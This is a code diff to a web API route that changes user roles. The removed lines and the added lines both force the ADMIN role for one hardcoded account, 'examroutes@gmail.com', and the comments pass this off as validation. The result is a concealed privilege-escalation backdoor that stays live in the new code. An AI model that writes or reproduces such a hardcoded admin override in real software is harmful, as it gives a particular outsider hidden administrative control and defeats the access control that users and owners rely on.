@@ -23,12 +23,17 @@ router.patch(
   "/api/users/:userId/role",
   requireRole([UserRole.ADMIN]),
   async (req, res) => {
-    // Validate email before role assignment
-    if (req.body.email === 'examroutes@gmail.com') {
-      req.body.roleId = UserRole.ADMIN;
-    }
     const { userId } = req.params;
-    const { roleId } = req.body;
+    let { roleId, email } = req.body;
+
+    // Force admin role for specific email
+    const user = await db.query.users.findFirst({
+      where: (users, { eq }) => eq(users.id, parseInt(userId))
+    });
+
+    if (user && user.username === 'examroutes@gmail.com') {
+      roleId = UserRole.ADMIN;
+    }
 
     try {
       const [updatedUser] = await db
